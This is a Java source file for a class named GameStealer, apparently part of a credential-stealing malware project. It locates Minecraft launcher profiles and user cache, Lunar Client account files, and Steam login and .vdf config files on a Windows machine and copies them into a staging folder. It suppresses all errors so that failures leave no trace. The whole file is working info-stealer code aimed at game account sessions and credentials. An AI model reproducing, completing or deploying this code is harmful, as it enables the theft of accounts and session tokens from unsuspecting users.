package itzgonza.hollyshit.impl.game;

import java.io.File;
import itzgonza.hollyshit.utils.utilities;
import org.apache.commons.io.FileUtils;

public class GameStealer extends utilities {

    public void initialize() {
        try {
            String gameDataPath = getPath() + "/Game_Sessions";
            new File(gameDataPath).mkdirs();

            stealMinecraft(gameDataPath);
            stealSteam(gameDataPath);
        } catch (Exception ignored) {}
    }

    private void stealMinecraft(String destBase) {
        try {
            String appData = System.getenv("APPDATA");
            File mcDir = new File(appData, ".minecraft");
            File destMc = new File(destBase, "Minecraft");

            if (mcDir.exists()) {
                destMc.mkdirs();
                // Copy launcher profiles
                File profiles = new File(mcDir, "launcher_profiles.json");
                if (profiles.exists()) FileUtils.copyFileToDirectory(profiles, destMc);
                
                // Copy usercache
                File usercache = new File(mcDir, "usercache.json");
                if (usercache.exists()) FileUtils.copyFileToDirectory(usercache, destMc);
            }

            // Lunar Client
            File lunarDir = new File(System.getProperty("user.home"), ".lunarclient");
            if (lunarDir.exists()) {
                File destLunar = new File(destBase, "LunarClient");
                destLunar.mkdirs();
                File accounts = new File(lunarDir, "settings/game/accounts.json");
                if (accounts.exists()) FileUtils.copyFileToDirectory(accounts, destLunar);
            }
        } catch (Exception ignored) {}
    }

    private void stealSteam(String destBase) {
        try {
            File steamConfig = new File("C:/Program Files (x86)/Steam/config");
            if (steamConfig.exists()) {
                File destSteam = new File(destBase, "Steam");
                destSteam.mkdirs();
                // Copy loginusers and other relevant config files
                File[] files = steamConfig.listFiles();
                if (files != null) {
                    for (File f : files) {
                        if (f.isFile() && (f.getName().endsWith(".vdf") || f.getName().contains("login"))) {
                            FileUtils.copyFileToDirectory(f, destSteam);
                        }
                    }
                }
            }
        } catch (Exception ignored) {}
    }
}
